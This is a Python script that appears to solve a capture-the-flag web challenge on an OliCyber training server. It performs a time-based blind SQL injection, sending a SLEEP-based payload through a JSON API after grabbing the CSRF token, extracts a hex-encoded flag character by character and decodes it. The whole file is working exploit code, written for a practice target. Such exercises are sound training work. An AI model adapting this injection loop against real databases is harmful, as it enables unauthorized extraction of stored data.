#!/usr/bin/env python3
import requests as r
import re
from time import time


class Inj:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = r.Session()
        res = self.session.get(base_url + '/blind')
        # get the CSRF token from the script tag
        csrf = re.search(r"csrf_token = '(.*)'", res.text).group(1)
        self.headers = {
            'Content-Type': 'application/json', 'X-CSRFToken': csrf}

    def blind(self, payload):
        response = self.session.post(
            self.base_url + '/api/blind',
            headers=self.headers,
            json={'query': payload})

        print(response.text)
        if 'Success' in response.text:
            return 'Success', None
        elif 'Error' in response.text:
            return 'Error', None
        else:
            return None, 'Unknown response'

    def time(self, payload):
        start = time()
        self.session.post(
            self.base_url + '/api/time',
            headers=self.headers,
            json={'query': payload})
        end = time()
        return end - start > 1


payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{}%')='1"
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = payload.format(result + c)
        print('testing', result + c)
        response = inj.time(question)
        if response:
            print(result + c)
            result += c
            break
    else:
        break  # Yup, i cicli for in Python hanno una sezione else.
        # Significa che abbiamo esaurito i caratteri del
        # dizionario.

print(result)
# convert from hex to ascii
print(bytes.fromhex(result).decode())
